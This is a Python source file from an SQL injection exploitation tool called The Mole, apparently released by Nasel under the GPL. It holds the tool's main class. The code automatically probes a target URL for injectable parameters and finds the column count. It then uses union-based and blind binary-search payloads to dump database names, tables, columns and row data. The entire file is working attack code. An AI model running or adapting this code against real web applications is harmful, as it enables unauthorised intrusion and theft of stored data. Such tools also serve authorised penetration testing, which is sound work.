#!/usr/bin/python3
# 
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 3 of the License, or
# (at your option) any later version.
#       
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#       
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
# MA 02110-1301, USA.
#
# Developed by: Nasel(http://www.nasel.com.ar)
# 
# Authors:
# Santiago Alessandri
# Matías Fontanini
# Gastón Traberg

from domanalyser import DomAnalyser,NeedleNotFound
from dbmsmoles import DbmsMole, Mysql5Mole
from dbdump import DatabaseDump
import sys, time

class TheMole:
    
    ex_string = 'Operation not supported for this dumper'
    field = '[_SQL_Field_]'
    table = '[_SQL_Table_]'
    
    dbms_mole_list = [Mysql5Mole]
    
    def __init__(self):
        self.initialized = False
        self.needle = None
        self.url = None
        self.requester = None
        self.wildcard = None
        self.mode = 'union'
        self.end = ' '
    
    def restart(self):
        self.initialized = False
    
    def initialize(self):
        self.analyser = DomAnalyser()
        if not self.requester:
            raise MoleAttributeRequired('Attribute requester is required')
        if not self.url:
            raise MoleAttributeRequired('Attribute url is required')
        if not self.wildcard:
            raise MoleAttributeRequired('Attribute wildcard is required')
        if not self.needle:
            raise MoleAttributeRequired('Attribute needle is required')
        self.separator = ''
        self.comment = ''
        self.parenthesis = 0
        self.database_dump = DatabaseDump()
        
        original_request = self.get_requester().request(self.url.replace(self.wildcard, ''))
        try:
            self.analyser.set_good_page(original_request, self.needle)
        except NeedleNotFound:
            print('[-] Could not find needle.')
            return
        
        try:
            self._find_separator()
        except SQLInjectionNotDetected:
            print('[-] Could not detect SQL Injection.')
            return
        if self.mode == 'union':
            req = self.get_requester().request(
                self.generate_url('{sep} own3d by 1')
            )
            self._syntax_error_content = self.analyser.node_content(req)
            
            try:
                self._find_comment_delimiter()
            except SQLInjectionNotExploitable:
                print('[-] Could not exploit SQL Injection.')
                return
            
            self._find_column_number()
            
            try:
                self._find_injectable_field()
            except SQLInjectionNotExploitable:
                print('[-] Could not exploit SQL Injection.')
                return
            
            self._detect_dbms()
        else:
            if not self.separator == ' ':
                self.end = 'and {sep}{sep}={sep}'.format(sep=self.separator)
            else:
                self.end = ' '
            self._detect_dbms_blind()
        
        self.initialized = True

    def generate_url(self, injection_string):
        return self.url.replace(self.wildcard,
                                injection_string.format(sep=self.separator,
                                                        com=self.comment,
                                                        par=(self.parenthesis * ')'),
                                                        end=self.end)
                                )
    
    def get_requester(self):
        return self.requester
    
    def poll_databases(self):
        if self.database_dump.db_map:
            return list(self.database_dump.db_map.keys())
        else:
            return None

    def abort_query(self):
        self.stop_query = True

    def _generic_query(self, count_query, query_generator, result_parser = lambda x: x[0]):
        req = self.get_requester().request(self.generate_url(count_query))
        result = self._dbms_mole.parse_results(self.analyser.decode(req))
        if not result or len(result) != 1:
            raise QueryError()
        else:
            dump_result = []
            self.stop_query = False
            for i in range(int(result[0])):
                if self.stop_query:
                    break
                req = self.get_requester().request(self.generate_url(query_generator(i)))
                result = self._dbms_mole.parse_results(req.decode(self.analyser.encoding))
                if not result or len(result) < 1:
                    raise QueryError()
                else:
                    dump_result.append(result_parser(result))
            dump_result.sort()
            return dump_result

    def get_databases(self, force_fetch=False):
        if not force_fetch and self.database_dump.db_map:
            return list(self.database_dump.db_map.keys())
        if self.mode == 'union':
            data = self._generic_query(
                self._dbms_mole.schema_count_query(self.query_columns, self.injectable_field), 
                lambda x: self._dbms_mole.schema_query(
                    self.query_columns, self.injectable_field, x
                )
            )
        else:
            data = self._blind_query(
                lambda x,y: self._dbms_mole.schema_blind_count_query(x, y), 
                lambda x: lambda y,z: self._dbms_mole.schema_blind_len_query(y, z, offset=x),
                lambda x,y,z: self._dbms_mole.schema_blind_data_query(x, y, offset=z),
            )
            data = list(map(lambda x: x[0], data))
        for i in data:
            self.database_dump.add_db(i)
        return data

    def poll_tables(self, db):
        if self.database_dump.db_map[db]:
            return list(self.database_dump.db_map[db].keys())
        else:
            return None

    def get_tables(self, db, force_fetch=False):
        if not force_fetch and db in self.database_dump.db_map and self.database_dump.db_map[db]:
            return list(self.database_dump.db_map[db].keys())
        if self.mode == 'union':
            data = self._generic_query(
                self._dbms_mole.table_count_query(db, self.query_columns, self.injectable_field), 
                lambda x: self._dbms_mole.table_query(
                    db, self.query_columns, self.injectable_field, x
                ),
            )
        else:
            data = self._blind_query(
                lambda x,y: self._dbms_mole.table_blind_count_query(x, y, db=db), 
                lambda x: lambda y,z: self._dbms_mole.table_blind_len_query(y, z, db=db, offset=x),
                lambda x,y,z: self._dbms_mole.table_blind_data_query(x, y, db=db, offset=z),
            )
            data = list(map(lambda x: x[0], data))
        for i in data:
            self.database_dump.add_table(db, i)
        return data

    def poll_columns(self, db, table):
        if self.database_dump.db_map[db][table]:
            return list(self.database_dump.db_map[db][table])
        else:
            return None

    def get_columns(self, db, table, force_fetch=False):
        if not force_fetch and db in self.database_dump.db_map and table in self.database_dump.db_map[db] and len(self.database_dump.db_map[db][table]) > 0:
            return list(self.database_dump.db_map[db][table])
        if self.mode == 'union':
            data = self._generic_query(
                self._dbms_mole.columns_count_query(db, table, self.query_columns, self.injectable_field), 
                lambda x: self._dbms_mole.columns_query(
                    db, table, self.query_columns, self.injectable_field, x
                )
            )
        else:
            data = self._blind_query(
                lambda x,y: self._dbms_mole.columns_blind_count_query(x, y, db=db, table=table), 
                lambda x: lambda y,z: self._dbms_mole.columns_blind_len_query(y, z, db=db, table=table, offset=x),
                lambda x,y,z: self._dbms_mole.columns_blind_data_query(x, y, db=db, table=table, offset=z),
            )
            data = list(map(lambda x: x[0], data))
        for i in data:
            self.database_dump.add_column(db, table, i)
        return data

    def get_fields(self, db, table, fields, where="1=1"):
        if self.mode == 'union':
            return self._generic_query(
                self._dbms_mole.fields_count_query(db, table, self.query_columns, self.injectable_field, where=where), 
                lambda x: self._dbms_mole.fields_query(
                    db, table, fields, self.query_columns, self.injectable_field, x, where=where
                ),
                lambda x: x
            )
        else:
            return self._blind_query(
                lambda x,y: self._dbms_mole.fields_blind_count_query(x, y, table=table, where=where), 
                lambda x: lambda y,z: self._dbms_mole.fields_blind_len_query(y, z, fields=fields, table=table, offset=x, where=where),
                lambda x,y,z: self._dbms_mole.fields_blind_data_query(x, y, fields=fields, table=table, offset=z, where=where),
            )

    def get_dbinfo(self):
        if self.mode == 'union':
            req = self.get_requester().request(
                    self.generate_url(
                        self._dbms_mole.dbinfo_query(self.query_columns, self.injectable_field)
                    )
                  )
            data = self._dbms_mole.parse_results(req.decode(self.analyser.encoding))
        else:
            data = self._blind_query(
                None,
                lambda x: lambda y,z: self._dbms_mole.dbinfo_blind_len_query(y, z),
                lambda x,y,z: self._dbms_mole.dbinfo_blind_data_query(x, y),
                row_count=1, 
            )
            if len(data) != 1 or len(data[0]) != 2:
                raise QueryError()
            data = [data[0][0], data[0][1]]
        if not data or len(data) != 2:
            raise QueryError()
        else:
            return data

    def _generic_blind_len(self, count_fun, trying_msg, max_msg):
        length=0
        last =1
        while True and not self.stop_query:
            req = self.get_requester().request(
                self.generate_url(
                    count_fun('>', last)
                )
            )
            sys.stdout.write(trying_msg(last))
            sys.stdout.flush()
            if self.needle in self.analyser.decode(req):
                break;
            last *= 2
        sys.stdout.write(max_msg(str(last)))
        sys.stdout.flush()
        pri = last // 2
        while pri < last:
            if self.stop_query:
                return pri
            medio = ((pri + last) // 2) + ((pri + last) & 1)
            req = self.get_requester().request(
                self.generate_url(
                    count_fun('<', medio - 1)
                )
            )
            if self.needle in self.analyser.decode(req):
                pri = medio
            else:
                last = medio - 1
        return pri
        
    def _blind_query(self, count_fun, length_fun, query_fun, offset=0, row_count=None):
        self.stop_query = False
        if count_fun is None:
            count = row_count
        else:
            count = self._generic_blind_len(
                count_fun, 
                lambda x: '\rTrying count: ' + str(x),
                lambda x: '\rAt most count: ' + str(x)
            )
            print('\r[+] Found row count:', count)
        results = []
        for row in range(offset, count):
            if self.stop_query:
                return results
            length = self._generic_blind_len(
                length_fun(row),
                lambda x: '\rTrying length: ' + str(x),
                lambda x: '\rAt most length: ' + str(x)
            )
            print('\r[+] Guessed length:', length)
            output=''
            for i in range(1,length+1):
                pri   = ord(' ')
                last  = 126
                curSize = len(output)
                sys.stdout.write(' ')
                sys.stdout.flush()
                while curSize == len(output):
                    if self.stop_query:
                        return results
                    medio = (pri + last)//2
                    response = self.analyser.decode(
                        self.requester.request(
                            self.generate_url(query_fun(i, medio, row))
                        )
                    )
                    if self.needle in response:
                        pri = medio+1
                    else:
                        last = medio
                    if medio == last - 1:
                        sys.stdout.write('\b' + chr(medio+1))
                        output += chr(medio+1)
                    else:
                        if pri == last:                
                            sys.stdout.write('\b' + chr(medio))
                            output += chr(medio)   
                        else:
                            sys.stdout.write('\b' + chr(medio))
                    sys.stdout.flush()
            print('')
            results.append(output.split(self._dbms_mole.blind_field_delimiter()))
        return results

    
    def _find_separator(self):
        separator_list = ['\'', '"', ' ']
        separator = None
        for sep in separator_list:
            print('[i] Trying separator: "' + sep + '"')
            self.separator = sep
            req = self.get_requester().request(
                self.generate_url('{sep}{par} and {sep}1{sep}={sep}1')
            )
            if self.analyser.is_valid(req):
                separator = sep
                break
        if not separator:
            raise SQLInjectionNotDetected()
        print('[+] Found separator: "' + self.separator + '"')
        #Validate the negation of the query
        req = self.get_requester().request(
            self.generate_url('{sep}{par} and {sep}1{sep} = {sep}0')
        )
        if self.analyser.is_valid(req):
            raise SQLInjectionNotDetected()
    
    def _find_comment_delimiter(self):
        #Find the correct comment delimiter
        
        comment_list = ['#', '--', '/*', ' ']
        comment = None
        for parenthesis in range(0, 2):
            print('[i] Trying injection using',parenthesis,'parenthesis.')
            self.parenthesis = parenthesis
            for com in comment_list:
                print('[i] Trying injection using comment:',com)
                self.comment = com
                req = self.get_requester().request(
                    self.generate_url('{sep}{par} order by 1{com}')
                )
                if self.analyser.node_content(req) != self._syntax_error_content:
                    comment = com
                    break
            if not comment is None:
                break
        if comment is None:
            self.parenthesis = 0
            raise SQLInjectionNotExploitable()
        
        print("[+] Found comment delimiter:", self.comment)
    
    def _find_column_number(self):
        #Find the number of columns of the query
        #First get the content of needle in a wrong situation
        req = self.get_requester().request(
            self.generate_url('{sep}{par} order by 15000{com}')
        )
        content_of_needle = self.analyser.node_content(req)
        
        last = 2
        done = False
        new_needle_content = self.analyser.node_content(
            self.get_requester().request(
                self.generate_url('{sep}{par} order by %d {com}' % (last,))
            )
        )
        while new_needle_content != content_of_needle and not DbmsMole.is_error(new_needle_content):
            last *= 2
            sys.stdout.write('\r[i] Trying length: ' + str(last) + '     ')
            sys.stdout.flush()
            new_needle_content = self.analyser.node_content(
                self.get_requester().request(
                    self.generate_url('{sep}{par} order by %d {com}' % (last,))
                )
            )
        pri = last // 2
        sys.stdout.write('\r[i] Maximum length: ' + str(last) + '     ')
        sys.stdout.flush()
        while pri < last:
            medio = ((pri + last) // 2) + ((pri + last) & 1)
            sys.stdout.write('\r[i] Trying length: ' + str(medio) + '    ')
            sys.stdout.flush()
            new_needle_content = self.analyser.node_content(
                self.get_requester().request(
                    self.generate_url('{sep}{par} order by %d {com}' % (medio,))
                )
            )
            if new_needle_content != content_of_needle and not DbmsMole.is_error(new_needle_content):
                pri = medio
            else:
                last = medio - 1
        self.query_columns = pri
        print("\r[+] Found number of columns:", self.query_columns)
    
    def _find_injectable_field(self):
        used_hashes = set()
        base = 714
        for mole in TheMole.dbms_mole_list:
            hashes, to_search_hashes = mole.injectable_field_finger(self.query_columns, base)
            hash_string = ",".join(hashes)
            if not hash_string in used_hashes:
                req = self.get_requester().request(
                        self.generate_url(
                            "{sep}{par} and 1=0 union all select " + hash_string + " {com}"
                        )
                    ).decode(self.analyser.encoding)
                try:
                    self.injectable_fields = list(map(lambda x: int(x) - base, [hash for hash in to_search_hashes if hash in req]))
                    print("[+] Injectable fields found: [" + ', '.join(map(lambda x: str(x + 1), self.injectable_fields)) + "]")
                    self._filter_injectable_fields()
                    return
                except Exception as ex:
                    print(ex)
                    used_hashes.add(hash_string)                
        raise SQLInjectionNotExploitable()

    def _filter_injectable_fields(self):
        for field in self.injectable_fields:
            print('[i] Trying field', field + 1)
            for dbms_mole_class in TheMole.dbms_mole_list:
                query = dbms_mole_class.field_finger_query(self.query_columns,
                                                     field)
                url_query = self.generate_url(query)
                req = self.get_requester().request(url_query)
                if dbms_mole_class.field_finger() in self.analyser.decode(req):
                    self.injectable_field = field
                    print('[+] Found injectable field:', field + 1)
                    return
        raise Exception('[-] Could not inject.')

    def _detect_dbms(self):
        for dbms_mole_class in TheMole.dbms_mole_list:
            query = dbms_mole_class.dbms_check_query(self.query_columns,
                                                     self.injectable_field)
            url_query = self.generate_url(query)
            req = self.get_requester().request(url_query)
            parsed = dbms_mole_class().parse_results(self.analyser.decode(req))
            if parsed and len(parsed) > 0:
                self._dbms_mole = dbms_mole_class()
                print('[+] Found DBMS:', dbms_mole_class.dbms_name())
                return
        raise Exception('[-] Could not detect DBMS')

    def _detect_dbms_blind(self):
        for dbms_mole_class in TheMole.dbms_mole_list:
            query = dbms_mole_class.dbms_check_blind_query()
            url_query = self.generate_url(query)
            req = self.get_requester().request(url_query)
            if self.analyser.is_valid(req):
                self._dbms_mole = dbms_mole_class()
                print('[+] Found DBMS:', dbms_mole_class.dbms_name())
                return
        raise Exception('[-] Could not detect DBMS')


class TableNotDumped(Exception):
    pass

class ColumnsNotDumped(Exception):
    pass

class TableNotFound(Exception):
    pass

class DatabaseNotFound(Exception):
    pass

class DatabasesNotDumped(Exception):
    pass

class SQLInjectionNotDetected(Exception):
    pass

class SQLInjectionNotExploitable(Exception):
    pass

class QueryError(Exception):
    pass
    
class MoleAttributeRequired(Exception):
    def __init__(self, msg):
        self.message = msg
